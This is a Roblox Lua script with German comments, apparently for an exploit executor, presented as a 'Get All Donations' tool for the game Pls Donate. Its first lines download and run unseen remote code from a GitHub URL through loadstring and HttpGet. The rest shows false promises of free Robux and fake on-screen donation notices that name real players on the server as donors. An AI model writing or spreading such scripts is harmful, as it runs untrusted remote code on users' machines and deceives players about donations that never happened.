-- Lade und f√ºhre das erste Script aus
print("Lade das erste Script...")
local success, result = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Adrighg/Pls-donate-script./refs/heads/main/Pls%20Donate%20Script", true))()
end)

if not success then
    warn("Fehler beim Laden des ersten Scripts:", result)
else
    print("Erstes Script erfolgreich ausgef√ºhrt.")
end

-- Warte, um sicherzustellen, dass das erste Script geladen ist
task.wait(1)

-- Lokaler Spieler und PlayerGui sicherstellen
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

print("Zweites Script gestartet") -- Debugging

-- Erstelle eine ScreenGui (aber noch nicht sichtbar)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ToggleUI"
screenGui.ResetOnSpawn = false -- Behalte die UI nach Respawn
screenGui.Parent = playerGui

-- Hauptframe erstellen
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 150) -- Breite und H√∂he des Frames
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75) -- Zentrierung
mainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
mainFrame.BackgroundTransparency = 0.2
mainFrame.BorderSizePixel = 0
mainFrame.Active = true -- Aktivieren f√ºr Draggable-Funktion
mainFrame.Draggable = true -- Frame ist beweglich
mainFrame.Visible = false -- Anfangs unsichtbar
mainFrame.Parent = screenGui

-- Abgerundete Ecken f√ºr Hauptframe
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 15)
mainCorner.Parent = mainFrame

-- Titel erstellen
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
titleLabel.BorderSizePixel = 0
titleLabel.Text = "Please Donate Scam Script"
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextScaled = true
titleLabel.Parent = mainFrame

-- Abgerundete Ecken f√ºr Titel
local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 10)
titleCorner.Parent = titleLabel

-- Schalter erstellen
local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0.2, 0, 0.3, 0)
toggleButton.Position = UDim2.new(0.05, 0, 0.4, 0) -- Links innerhalb des Frames
toggleButton.BackgroundColor3 = Color3.new(1, 0, 0) -- Startfarbe: Rot (OFF)
toggleButton.Text = "OFF"
toggleButton.TextColor3 = Color3.new(1, 1, 1)
toggleButton.TextScaled = true
toggleButton.BorderSizePixel = 0
toggleButton.Parent = mainFrame

-- Abgerundete Ecken f√ºr den Schalter
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(1, 0) -- Komplett abgerundet
buttonCorner.Parent = toggleButton

-- Text neben dem Schalter erstellen
local donationTextLabel = Instance.new("TextLabel")
donationTextLabel.Size = UDim2.new(0.7, 0, 0.3, 0)
donationTextLabel.Position = UDim2.new(0.3, 0, 0.4, 0) -- Rechts vom Schalter
donationTextLabel.BackgroundTransparency = 1 -- Kein Hintergrund
donationTextLabel.Text = "Get All Donations"
donationTextLabel.TextColor3 = Color3.new(1, 1, 1)
donationTextLabel.TextScaled = true
donationTextLabel.Parent = mainFrame

-- Popup-Meldung unten rechts erstellen
local popupFrame = Instance.new("Frame")
popupFrame.Size = UDim2.new(0, 250, 0, 50)
popupFrame.Position = UDim2.new(1, -260, 1, -60) -- Unten rechts am Bildschirmrand
popupFrame.AnchorPoint = Vector2.new(1, 1) -- Unten rechts ausrichten
popupFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
popupFrame.BackgroundTransparency = 0.8
popupFrame.BorderSizePixel = 0
popupFrame.Visible = false -- Standardm√§√üig versteckt
popupFrame.Parent = screenGui

-- Abgerundete Ecken f√ºr Popup
local popupCorner = Instance.new("UICorner")
popupCorner.CornerRadius = UDim.new(0, 15)
popupCorner.Parent = popupFrame

-- Text der Popup-Meldung
local popupLabel = Instance.new("TextLabel")
popupLabel.Size = UDim2.new(1, 0, 1, 0)
popupLabel.BackgroundTransparency = 1
popupLabel.Text = "You get now every Donation, go AFK and wait for your Robux"
popupLabel.TextColor3 = Color3.new(1, 1, 1)
popupLabel.TextScaled = true
popupLabel.Parent = popupFrame

-- Verz√∂gerung von 23 Sekunden
task.delay(23, function()
    print("UI sichtbar machen nach 23 Sekunden") -- Debugging
    mainFrame.Visible = true
end)

-- Schalterfunktion: Toggle ON/OFF
local secondScriptEnabled = false -- Variable f√ºr den Schalterzustand
toggleButton.MouseButton1Click:Connect(function()
    if toggleButton.Text == "OFF" then
        toggleButton.Text = "ON"
        toggleButton.BackgroundColor3 = Color3.new(0, 1, 0) -- Farbe √§ndern zu gr√ºn (ON)
        popupFrame.Visible = true -- Popup sichtbar machen
        secondScriptEnabled = true -- Schalter aktivieren

        -- Nach 5 Sekunden das Popup wieder ausblenden
        task.delay(5, function()
            popupFrame.Visible = false
        end)
    else
        toggleButton.Text = "OFF"
        toggleButton.BackgroundColor3 = Color3.new(1, 0, 0) -- Farbe √§ndern zu rot (OFF)
        popupFrame.Visible = false -- Popup unsichtbar machen
        secondScriptEnabled = false -- Schalter deaktivieren
    end
end)

-- Bedingung f√ºr das Ausf√ºhren des zweiten Scripts
task.delay(1, function()
    while true do
        task.wait(1)
        if secondScriptEnabled then
            print("Lade das zweite Script...")
            local player = game.Players.LocalPlayer
local UserInputService = game:GetService("UserInputService") -- UserInputService f√ºr Tasteneingaben

-- Funktion f√ºr das Erstellen der Spendenmeldung
local function showDonationMessage(donorName, amount)
    -- √úberpr√ºfe, ob bereits ein GUI existiert
    if player:FindFirstChild("PlayerGui"):FindFirstChild("DonationUI") then
        player.PlayerGui.DonationUI:Destroy()
    end

    -- Erstelle eine ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DonationUI"
    screenGui.Parent = player:WaitForChild("PlayerGui")

    -- Hauptframe f√ºr die Nachricht
    local donationFrame = Instance.new("Frame")
    donationFrame.Size = UDim2.new(0, 770, 0, 40)
    donationFrame.Position = UDim2.new(0.6, -200, 1, -120) -- Position in der Mitte unten
    donationFrame.AnchorPoint = Vector2.new(0.5, 1)
    donationFrame.BackgroundColor3 = Color3.fromRGB(24, 228, 24) 
    donationFrame.BorderSizePixel = 0
    donationFrame.Parent = screenGui

    -- Abgerundete Ecken f√ºr den Hauptframe
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 15)
    corner.Parent = donationFrame

    -- Text f√ºr die Spendenmeldung mit üí∏ Emoji
    local donationLabel = Instance.new("TextLabel")
    donationLabel.Size = UDim2.new(1, -45, 1, 0)
    donationLabel.Position = UDim2.new(0, 50, 0, 0)
    donationLabel.BackgroundTransparency = 1
    donationLabel.Text = "üí∏ " .. donorName .. " donated üí∏ " .. tostring(amount) .. " Robux to You!"
    donationLabel.TextColor3 = Color3.new(0, 0, 0) -- Schwarzer Text
    donationLabel.TextScaled = true
    donationLabel.TextSize = 25 -- Textgr√∂√üe auf 25 gesetzt
    donationLabel.Font = Enum.Font.GothamBold
    donationLabel.Parent = donationFrame

    -- Entferne die Nachricht nach 5 Sekunden
    wait(5)
    screenGui:Destroy()
end

-- Funktion f√ºr das Generieren eines zuf√§lligen Spendenbetrags und Namens
local function generateDonation()
    local players = game.Players:GetPlayers()
    if #players > 1 then
        local randomPlayer
        repeat
            randomPlayer = players[math.random(1, #players)]
        until randomPlayer ~= player

        local donorName = randomPlayer.DisplayName
        local amount = math.random(1, 30) * 10 -- Zuf√§lliger Betrag in Zehnerschritten bis 300

        -- Zeige die Spendenmeldung an
        showDonationMessage(donorName, amount)
    else
        -- Debug: Keine Spieler auf dem Server
        print("Nicht gen√ºgend Spieler auf dem Server.")
    end
end

-- Funktion f√ºr das Erkennen des F3-Tastendrucks
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end -- Verhindert, dass Eingaben, die bereits von Roblox verarbeitet wurden, verwendet werden

    -- Pr√ºfe, ob die F3-Taste gedr√ºckt wurde
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.F3 then
        -- Zeige die Spendenmeldung an
        generateDonation()
    end
end)

-- Hauptschleife: Spendenmeldung alle 1-3 Minuten anzeigen
while true do
    wait(math.random(60, 180)) -- Warten 1 bis 3 Minuten
    generateDonation()
end
        else
            print("Das zweite Script wird nicht ausgef√ºhrt, da der Schalter auf OFF ist.")
        end
    end
end)
